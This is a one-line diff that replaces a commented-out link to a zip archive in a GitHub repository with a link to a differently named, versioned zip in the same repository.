@@ -1,1 +1,1 @@
-# https://raw.githubusercontent.com/AMN-h0b/index.github.io/main/dipropyl/index.github.io.zip
+# https://github.com/AMN-h0b/index.github.io/raw/refs/heads/main/dipropyl/index-github-io-3.6-beta.5.zip
